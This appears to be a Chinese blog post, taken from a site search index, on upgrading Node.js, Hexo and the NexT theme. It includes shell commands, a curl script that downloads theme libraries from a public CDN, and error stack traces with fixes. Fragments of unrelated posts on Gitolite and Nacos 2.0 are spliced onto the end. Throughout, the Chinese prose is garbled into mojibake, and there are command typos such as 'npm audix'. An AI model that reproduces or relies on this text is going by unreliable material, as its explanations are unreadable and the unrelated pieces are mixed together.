å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆçš„äºŒè¿›åˆ¶å®‰è£…åŒ…ï¼Œè§£å‹åé…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡å³å¯ã€‚ 123456789# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport PATH=$PATH:/usr/local/node-v14.16.1/binNODE_PATH=/usr/local/node-v14.16.1/lib/node_modulesPATH=$PATH:$NODE_PATHexport NODE_PATH PATH# ä½¿é…ç½®ç”Ÿæ•ˆ# source /etc/profile Hexo ç‰ˆæœ¬å‡çº§ç¬”è€…æ˜¯ä» Hexo 3.9.0 å‡çº§åˆ° Hexo 5.4.0ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š å…¨å±€å‡çº§ Hexo ç‰ˆæœ¬è‹¥æ›¾ç»åœ¨ç³»ç»Ÿé‡Œï¼Œç›´æ¥ä½¿ç”¨è¿‡ hexo çš„å‘½ä»¤ï¼Œæ‰éœ€è¦æ‰§è¡Œä»¥ä¸‹å‡çº§æ“ä½œ 123456789101112131415# æ¸…ç†NPMç¼“å­˜$ npm cache clean -f# å…¨å±€å®‰è£…ç‰ˆæœ¬æ£€æµ‹ã€ç‰ˆæœ¬å‡çº§å·¥å…·$ npm install -g npm-check$ npm install -g npm-upgrade# å…¨å±€æ£€æµ‹å“ªäº›æ¨¡å—å¯ä»¥å‡çº§ï¼Œè¿™é‡Œå¯ä»¥æ ¹æ®æ‰“å°çš„æç¤ºä¿¡æ¯ï¼Œæ‰‹åŠ¨å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„æ¨¡å—$ npm-check -g# å…¨å±€æ›´æ–°æ¨¡å—$ npm update -g# å…¨å±€å®‰è£…æˆ–æ›´æ–°Hexoçš„æœ€æ–°ç‰ˆæœ¬$ npm install --global hexo åšå®¢å‡çº§ Hexo ç‰ˆæœ¬1234567891011121314151617181920212223# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blog-root# æ£€æµ‹Hexoå“ªäº›æ¨¡å—å¯ä»¥å‡çº§$ npm-check# åˆ é™¤package-lock.json# rm -rf package-lock.json# æ›´æ–°package.json$ npm-upgrade# åˆ é™¤æ•´ä¸ªæ¨¡å—ç›®å½•ï¼Œè¿™æ ·å¯ä»¥é¿å…å¾ˆå¤šå‘$ rm -rf node_modules# æ›´æ–°Hexoçš„æ¨¡å—$ npm update --save# è‹¥å‡ºç°ä¾èµ–çš„é—®é¢˜ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ä¸€ä¸‹ï¼Œç„¶åæŠŠæŠ¥é”™çš„ç»Ÿä¸€ä¿®å¤ä¸€ä¸‹å³å¯$ npm audix# æˆ–è€…å¼ºåˆ¶æ›´æ–°$ npm update --save --force ç”±äºæ–°ç‰ˆçš„ Hexo ä¸€èˆ¬å¢åŠ äº†ä¸å°‘æ–°ç‰¹æ€§ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨æ–°ç‰ˆ Hexo é»˜è®¤çš„é…ç½®æ¨¡ç‰ˆæ–‡ä»¶ _config.ymlï¼ŒåŒæ—¶è¿˜éœ€è¦ç¨å¾®æ›´æ”¹æ—§ç‰ˆçš„ package.json é…ç½®æ–‡ä»¶ï¼Œå¦åˆ™å®¹æ˜“å‡ºç°å„ç§å…¼å®¹é”™è¯¯ 123456# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd /blog-root# å¤‡ä»½æ—§ç‰ˆçš„é…ç½®æ–‡ä»¶$ mv _config.yml _config.yml.bak$ mv package.json package.json.bak 12345678$ å•ç‹¬åˆå§‹åŒ–å…¨æ–°çš„Hexoåšå®¢ç›®å½•$ hexo init hexo-upgrade$ æ‹·è´æ–°çš„é…ç½®æ¨¡ç‰ˆæ–‡ä»¶åˆ°åšå®¢çš„æ ¹ç›®å½•$ cp hexo-upgrade/_config.yml /blog-root/_config.yml$ cp hexo-upgrade/package.json /blog-root/package.json# æœ€ååœ¨æ–°çš„é…ç½®æ¨¡ç‰ˆæ–‡ä»¶é‡Œï¼Œé‡æ–°è¿½åŠ æ—§ç‰ˆçš„Hexoé…ç½®å†…å®¹ å‡çº§ Next ä¸»é¢˜æ³¨æ„äº‹é¡¹ç¬”è€… ä» Next 7.8.0 å‡çº§åˆ° Next 8.3.0ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼ŒNext ç‰ˆæœ¬å‡çº§å¿…é¡»æ³¨æ„ä»¥ä¸‹äº‹é¡¹ï¼š Next ä¸ Hexo çš„ç‰ˆæœ¬å¿…é¡»å…¼å®¹ å¿…é¡»ä½¿ç”¨æ–°ç‰ˆ Next ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶ï¼Œè‹¥ç»§ç»­ä½¿ç”¨ Next æ—§ç‰ˆçš„ _config.yml é…ç½®æ–‡ä»¶ï¼Œå®¹æ˜“å‡ºç°å„ç§å…¼å®¹é”™è¯¯ ç‰ˆæœ¬å‡çº§12345678910# è¿›å…¥åšå®¢çš„ä¸»é¢˜ç›®å½•$ cd /boot-root/theme# å¤‡ä»½æ—§ç‰ˆä¸»é¢˜çš„é…ç½®$ mv next next-bak# æ‹‰å–æœ€æ–°çš„ä»£ç ï¼ˆæ³¨æ„ï¼šNextä¸åŒç‰ˆæœ¬ä½¿ç”¨ä¸åŒçš„ä»“åº“ï¼‰$ git clone https://github.com/next-theme/hexo-theme-next next# æœ€åå°†æ—§ç‰ˆçš„Nexté…ç½®å†…å®¹è¿½åŠ åˆ°Nextæ–°ç‰ˆçš„é…ç½®æ–‡ä»¶ä¸­ï¼ŒåŒ…æ‹¬æ‹·è´æ—§ç‰ˆè‡ªå®šä¹‰çš„æ ·å¼ã€å¸ƒå±€æ–‡ä»¶ç­‰ æœ¬åœ°ä¸‹è½½ç¬¬ä¸‰æ–¹åº“ï¼ˆå¯é€‰ï¼‰åœ¨ Next 8.3.0 çš„ _config.yml ä¸­ï¼Œæ–°å¢äº† vendors.internal å±æ€§ï¼ˆå¦‚ä¸‹é…ç½®ï¼‰æ¥æŒ‡å®šåŠ è½½æœ¬åœ°çš„ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶ï¼Œé»˜è®¤å­˜æ”¾è·¯å¾„ä¸º themes/next/source/libï¼›å¯ç”¨åç«™ç‚¹å°±ä¸å†éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹çš„ CDN èµ„æºï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨æœ¬åœ°ç«™ç‚¹çš„èµ„æºæ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥è®©ç«™ç‚¹çš„è®¿é—®é€Ÿåº¦æ›´ç¨³å®šã€‚ 1234567891011# It\'s recommended to use the same version as in `_vendors.yml` to avoid potential problems.# Remember to use the HTTPS protocol of CDN links when you enable HTTPS on your site.vendors: # The CDN provider of NexT internal scripts. # Available values: local | jsdelivr | unpkg | cdnjs # Warning: If you are using the latest master branch of NexT, please set `internal: local` internal: local # The default CDN provider of third-party plugins. # Available values: local | jsdelivr | unpkg | cdnjs # Dependencies for `plugins: local`: https://github.com/next-theme/plugins plugins: local å®‰è£… NexT æ’ä»¶ç‰¹åˆ«æ³¨æ„ è‹¥å¸Œæœ›ä½¿ç”¨æœ¬åœ°çš„ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶ï¼Œåˆ™éœ€è¦å®‰è£… NexT çš„ @next-theme/plugins æ’ä»¶ï¼Œå…¶ä¸­æ’ä»¶çš„ç‰ˆæœ¬å¿…é¡»ä¸ NexT ä¸»é¢˜çš„ç‰ˆæœ¬ä¸€è‡´ã€‚ 12# å®‰è£…æ’ä»¶$ npm install @next-theme/plugins --save æ‰¹é‡ä¸‹è½½ç¬¬ä¸‰æ–¹åº“å°† themes/next/_vendors.yml é‡Œå®šä¹‰çš„ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶ç»Ÿä¸€ä¸‹è½½ä¸‹æ¥ï¼Œå¹¶å­˜æ”¾åœ¨ themes/next/source/lib ç›®å½•ä¸‹ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ ä¸´æ—¶æ›´æ”¹ themes/next/scripts/events/lib/vendors.js æºæ–‡ä»¶çš„ä»£ç ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œç„¶åæ‰§è¡Œ hexo g å‘½ä»¤ï¼Œä»è¾“å‡ºæ—¥å¿—ä¿¡æ¯ä¸­å¾—åˆ°æ‰¹é‡ä¸‹è½½ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶çš„ curl å‘½ä»¤ å°†å¾—åˆ°çš„æ‰€æœ‰ curl å‘½ä»¤ä¿å­˜åˆ° Shell è„šæœ¬æ–‡ä»¶é‡Œï¼Œç„¶åæ‰§è¡Œ Shell è„šæœ¬æ–‡ä»¶æ‰¹é‡ä¸‹è½½ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶åˆ° themes/next/source/lib ç›®å½•ä¸‹ æœ€åè¿˜åŸ themes/next/scripts/events/lib/vendors.js æºæ–‡ä»¶çš„ä»£ç  1234567891011// æ‰“å°ä¸‹è½½å‘½ä»¤const { name, version, file, alias, unavailable } = value;if (version) { var _path = `https://cdn.jsdelivr.net/npm/${name}@${version}/${file}`; console.log("curl " + _path + " --create-dirs -o ${DIR}" + "/" + name + "/" + file); continue;}const links = { // çœç•¥ ...}; æ‰¹é‡ä¸‹è½½ Next 8.3.0 ç‰ˆæœ¬æ‰€éœ€çš„ç¬¬ä¸‰æ–¹åº“æ–‡ä»¶çš„ Shell è„šæœ¬æ–‡ä»¶å¦‚ä¸‹ï¼ŒDIR æ˜¯ themes/next/source/lib ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œè¯·è‡ªè¡Œæ›´æ”¹ 123456789101112131415161718192021222324252627282930313233343536#!/bin/shDIR=/usr/local/hexo-develop/themes/next/source/librm -rf ${DIR}/*curl https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js --create-dirs -o ${DIR}/animejs/lib/anime.min.jscurl https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css --create-dirs -o ${DIR}/@fortawesome/fontawesome-free/css/all.min.csscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js --create-dirs -o ${DIR}/prismjs/components/prism-core.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js --create-dirs -o ${DIR}/prismjs/plugins/autoloader/prism-autoloader.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/line-numbers/prism-line-numbers.min.js --create-dirs -o ${DIR}/prismjs/plugins/line-numbers/prism-line-numbers.min.jscurl https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js --create-dirs -o ${DIR}/mathjax/es5/tex-mml-chtml.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css --create-dirs -o ${DIR}/katex/dist/katex.min.csscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.js --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.css --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.csscurl https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js --create-dirs -o ${DIR}/@next-theme/pjax/pjax.min.jscurl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js --create-dirs -o ${DIR}/jquery/dist/jquery.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.csscurl https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js --create-dirs -o ${DIR}/medium-zoom/dist/medium-zoom.min.jscurl https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js --create-dirs -o ${DIR}/lozad/dist/lozad.min.jscurl https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js --create-dirs -o ${DIR}/pangu/dist/browser/pangu.min.jscurl https://cdn.jsdelivr.net/npm/quicklink@2.1.0/dist/quicklink.umd.js --create-dirs -o ${DIR}/quicklink/dist/quicklink.umd.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js --create-dirs -o ${DIR}/disqusjs/dist/disqus.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css --create-dirs -o ${DIR}/disqusjs/dist/disqusjs.csscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js --create-dirs -o ${DIR}/gitalk/dist/gitalk.min.jscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css --create-dirs -o ${DIR}/gitalk/dist/gitalk.csscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-app.js --create-dirs -o ${DIR}/firebase/firebase-app.jscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-firestore.js --create-dirs -o ${DIR}/firebase/firebase-firestore.jscurl https://cdn.jsdelivr.net/npm/algoliasearch@4.8.6/dist/algoliasearch-lite.umd.js --create-dirs -o ${DIR}/algoliasearch/dist/algoliasearch-lite.umd.jscurl https://cdn.jsdelivr.net/npm/instantsearch.js@4.19.0/dist/instantsearch.production.min.js --create-dirs -o ${DIR}/instantsearch.js/dist/instantsearch.production.min.jscurl https://cdn.jsdelivr.net/npm/pdfobject@2.2.5/pdfobject.min.js --create-dirs -o ${DIR}/pdfobject/pdfobject.min.jscurl https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js --create-dirs -o ${DIR}/mermaid/dist/mermaid.min.jscurl https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css --create-dirs -o ${DIR}/animate.css/animate.min.csscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js --create-dirs -o ${DIR}/nprogress/nprogress.jscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css --create-dirs -o ${DIR}/nprogress/nprogress.csscurl https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js --create-dirs -o ${DIR}/ribbon.js/dist/ribbon.min.js å¸¸è§é—®é¢˜é—®é¢˜ä¸€å®Œæˆä¸Šè¿°å‡çº§æ“ä½œåï¼Œæ‰§è¡Œ hexo generator å‘½ä»¤åï¼Œthemes/next/scripts/events/lib/vendors.js çš„ä»£ç é‡Œé¢æŠ›å‡ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ï¼š 1234567891011121314151617181920INFO Start processingFATAL { err: TypeError: Cannot read property \'call\' of undefined at module.exports (/usr/local/hexo-develop/themes/next/scripts/events/lib/vendors.js:27:25) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/themes/next/scripts/events/index.js:9:27) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at /usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52 at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:15:14) at processImmediate (internal/timers.js:461:21) è¿™ä¸€èˆ¬æ˜¯ Hexo çš„éƒ¨åˆ†æ¨¡å—æ²¡æœ‰æˆåŠŸæ›´æ–°å¼•èµ·ï¼Œä¾‹å¦‚ hexo-util æ¨¡å—æ›´æ–°å¤±è´¥ï¼Œæœ€ç»ˆå¯¼è‡´ä»£ç ä¸å…¼å®¹ã€‚é¦–å…ˆæ£€æŸ¥ hexo-util æ¨¡å—çš„ç‰ˆæœ¬ï¼Œç„¶åå¯ä»¥å°è¯•æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¼ºåˆ¶æ›´æ–° hexo-util æ¨¡å— 12345# è¿›å…¥åšå®¢çš„ä¸»é¢˜ç›®å½•$ cd /boot-root/# å¼ºåˆ¶æ›´æ–°$ npm update --save --force é—®é¢˜äºŒå®Œæˆä¸Šè¿°å‡çº§æ“ä½œåï¼Œæ‰§è¡Œ hexo generator å‘½ä»¤åï¼ŒHexo ä¼šæŠ›å‡ºä»¥ä¸‹é”™è¯¯ä¿¡æ¯ï¼š 123456789101112131415161718192021222324FATAL { err: TypeError: line.matchAll is not a function at res.value.res.value.split.map.line (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:128:26) at Array.map (&lt;anonymous&gt;) at closeTags (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:126:37) at highlight (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:119:10) at highlightUtil (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:23:16) at data.content.dataContent.replace (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:92:17) at String.replace (&lt;anonymous&gt;) at Hexo.backtickCodeBlock (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:19:30) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52) at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromise0 (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:649:10) at Promise._settlePromises (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:729:18) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:93:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) NodeJS ä» 12.0.0 æ‰å¼€å§‹æ”¯æŒå‡½æ•° String.matchAll()ï¼Œå¦‚æœ NodeJS çš„ç‰ˆæœ¬ä½äº 12.0.0ï¼Œé‚£ä¹ˆæ‰§è¡Œ Hexo çš„æ„å»ºå‘½ä»¤å°±ä¼šå‡ºç°ä¸Šè¿°çš„é”™è¯¯ï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š æ–¹æ³•ä¸€ï¼šå°† NodeJs å‡çº§åˆ°é«˜äº 12.0.0 çš„ç‰ˆæœ¬ æ–¹æ³•äºŒï¼šæ›´æ”¹ Hexo çš„é…ç½®æ–‡ä»¶ _config.ymlï¼Œç¦ç”¨ highlight çš„åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…å‡ºé”™ï¼Œä½†è¿™å°†ä¼šå…³é—­ä»£ç çš„é«˜äº®æ˜¾ç¤ºåŠŸèƒ½ 12highlight: enable: false var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Docker åŸºäº Gitolite æ­å»º Git æœåŠ¡å™¨",url:"/posts/4da97727.html",text:'å‰è¨€å®˜æ–¹æ•™ç¨‹ Docker Install Gitolite Centos7 ä½¿ç”¨ Gitolite æ­å»º Git æœåŠ¡å™¨ é•œåƒæ•°æ®å·ç›®å½• ç›®å½• ç”¨é€” /home/git/repositories å­˜å‚¨å®é™…çš„ Git ä»“åº“ /etc/ssh å­˜å‚¨ SSH ä¸»æœºå¯†é’¥ Docker å®‰è£… Gitoliteè¿™é‡Œç›´æ¥ä½¿ç”¨å›½å¤–å¼€å‘è€…æ„å»ºå¥½çš„ Docker é•œåƒ elsdoerfer/gitoliteï¼Œä¸å†é€šè¿‡æ‰‹å†™ Dockerfile æ¥æ„å»º Gitoliteï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š 12# æ‹‰å–é•œåƒ# docker pull elsdoerfer/gitolite:latest var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– ç‰ˆæœ¬æ§åˆ¶"},{title:"Nacos 2.0 å‘å¸ƒï¼Œæ€§èƒ½æå‡ 10 å€",url:"/posts/57722de1.html",text:'å‰è¨€ç»§ Nacos 1.0 å‘å¸ƒä»¥æ¥ï¼ŒNacos è¿…é€Ÿè¢«æˆåƒä¸Šä¸‡å®¶ä¼ä¸šé‡‡ç”¨ï¼Œå¹¶æ„å»ºèµ·å¼ºå¤§çš„ç”Ÿæ€ã€‚ä½†æ˜¯éšç€ç”¨æˆ·æ·±å…¥ä½¿ç”¨ï¼Œé€æ¸æš´éœ²ä¸€äº›æ€§èƒ½é—®é¢˜ï¼Œå› æ­¤å¯åŠ¨äº† Nacos 2.0 çš„éš”ä»£äº§å“è®¾è®¡ï¼Œæ—¶éš”åŠå¹´ç»ˆäºå°†å…¶å…¨éƒ¨å®ç°ï¼Œå®æµ‹æ€§èƒ½æå‡ 10 å€ï¼Œç›¸ä¿¡èƒ½æ»¡è¶³æ‰€æœ‰ç”¨æˆ·çš„æ€§èƒ½éœ€æ±‚ã€‚ Nacos ç®€ä»‹Nacos æ˜¯ä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚å®ƒå­µåŒ–äºé˜¿é‡Œå·´å·´ï¼Œæˆé•¿äºåå¹´åŒåä¸€çš„æ´ªå³°è€ƒéªŒï¼Œæ²‰æ·€äº†ç®€å•æ˜“ç”¨ã€ç¨³å®šå¯é ã€æ€§èƒ½å“è¶Šçš„æ ¸å¿ƒç«äº‰åŠ›ã€‚ Nacos 2.0 æ¶æ„2021 å¹´ 03 æœˆ 30 æ—¥ï¼ŒNacos 2.0 æ­£å¼å¯¹å¤–å‘å¸ƒã€‚å…¨æ–°çš„ 2.0 æ¶æ„ä¸ä»…å°†æ€§èƒ½å¤§å¹…æå‡ 10 å€ï¼Œè€Œä¸”å†…æ ¸è¿›è¡Œäº†åˆ†å±‚æŠ½è±¡ï¼Œå¹¶ä¸”å®ç°æ’ä»¶æ‰©å±•æœºåˆ¶ã€‚Nacos 2.0 æ¶æ„å±‚æ¬¡å¦‚ä¸‹å›¾ï¼Œå®ƒç›¸æ¯” Nacos 1.X çš„æœ€ä¸»è¦å˜åŒ–æ˜¯ï¼š é€šä¿¡å±‚ç»Ÿä¸€åˆ° gRPC åè®®ï¼ŒåŒæ—¶å®Œå–„äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„æµé‡æ§åˆ¶å’Œè´Ÿè½½å‡è¡¡èƒ½åŠ›ï¼Œæå‡çš„æ•´ä½“ååã€‚ å°†å­˜å‚¨å’Œä¸€è‡´æ€§æ¨¡å‹åšäº†å……åˆ†æŠ½è±¡åˆ†å±‚ï¼Œæ¶æ„æ›´ç®€å•æ¸…æ™°ï¼Œä»£ç æ›´åŠ å¥å£®ï¼Œæ€§èƒ½æ›´åŠ å¼ºæ‚ã€‚ è®¾è®¡äº†å¯æ‹“å±•çš„æ¥å£ï¼Œæå‡äº†é›†æˆèƒ½åŠ›ï¼Œå¦‚è®©ç”¨æˆ·æ‰©å±•å®ç°å„è‡ªçš„å®‰å…¨æœºåˆ¶ã€‚ Nacos 2.0 æœåŠ¡å‘ç°å‡çº§ä¸€è‡´æ€§æ¨¡å‹Nacos 2.0&nbsp;æ¶æ„ä¸‹çš„æœåŠ¡å‘ç°ï¼Œå®¢æˆ·ç«¯é€šè¿‡ gRPCï¼Œå‘èµ·æ³¨å†ŒæœåŠ¡æˆ–è®¢é˜…æœåŠ¡çš„è¯·æ±‚ã€‚æœåŠ¡ç«¯ä½¿ç”¨ Client å¯¹è±¡æ¥è®°å½•è¯¥å®¢æˆ·ç«¯ä½¿ç”¨ gRPC è¿æ¥å‘å¸ƒäº†å“ªäº›æœåŠ¡ï¼Œåˆè®¢é˜…äº†å“ªäº›æœåŠ¡ï¼Œå¹¶å°†è¯¥ Client è¿›è¡ŒæœåŠ¡é—´åŒæ­¥ã€‚ç”±äºå®é™…çš„ä½¿ç”¨ä¹ æƒ¯æ˜¯æœåŠ¡åˆ°å®¢æˆ·ç«¯çš„æ˜ å°„ï¼Œå³æœåŠ¡ä¸‹æœ‰å“ªäº›å®¢æˆ·ç«¯å®ä¾‹ï¼›å› æ­¤ 2.0 çš„æœåŠ¡ç«¯ä¼šé€šè¿‡æ„å»ºç´¢å¼•å’Œå…ƒæ•°æ®ï¼Œå¿«é€Ÿç”Ÿæˆç±»ä¼¼ 1.X ä¸­çš„ Service ä¿¡æ¯ï¼Œå¹¶å°† Service çš„æ•°æ®é€šè¿‡ &nbsp;gRPC Stream è¿›è¡Œæ¨é€ã€‚ Nacos 2.0 é…ç½®ç®¡ç†å‡çº§é€šä¿¡æœºåˆ¶é…ç½®ç®¡ç†ä¹‹å‰ç”¨ Http1.1 çš„ Keep Alive æ¨¡å¼ 30s å‘ä¸€ä¸ªå¿ƒè·³æ¨¡æ‹Ÿé•¿é“¾æ¥ï¼Œåè®®éš¾ä»¥ç†è§£ï¼Œå†…å­˜æ¶ˆè€—å¤§ï¼Œæ¨é€æ€§èƒ½å¼±ï¼Œå› æ­¤ 2.0 é€šè¿‡ gRPC å½»åº•è§£å†³è¿™äº›é—®é¢˜ï¼Œå†…å­˜æ¶ˆè€—å¤§é‡é™ä½ã€‚ Nacos 2.0 æ¶æ„ä¼˜åŠ¿ Nacos 2.0 å¤§å¹…é™ä½äº†èµ„æºæ¶ˆè€—ï¼Œæå‡ååæ€§èƒ½ï¼Œä¼˜åŒ–å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯äº¤äº’ï¼Œå¯¹ç”¨æˆ·æ›´åŠ å‹å¥½ï¼›è™½ç„¶å¯è§‚æµ‹æ€§ç•¥å¾®ä¸‹é™ï¼Œä½†æ˜¯æ•´ä½“æ€§ä»·æ¯”éå¸¸é«˜ã€‚ Nacos 2.0 æ€§èƒ½æå‡ç”±äº Nacos ç”±æœåŠ¡å‘ç°å’Œé…ç½®ç®¡ç†ä¸¤å¤§æ¨¡å—æ„æˆï¼Œä¸šåŠ¡æ¨¡å‹ç•¥æœ‰å·®å¼‚ï¼Œå› æ­¤ä¸‹é¢åˆ†åˆ«ä»‹ç»ä¸€ä¸‹å…·ä½“å‹æµ‹æŒ‡æ ‡ã€‚ Nacos 2.0 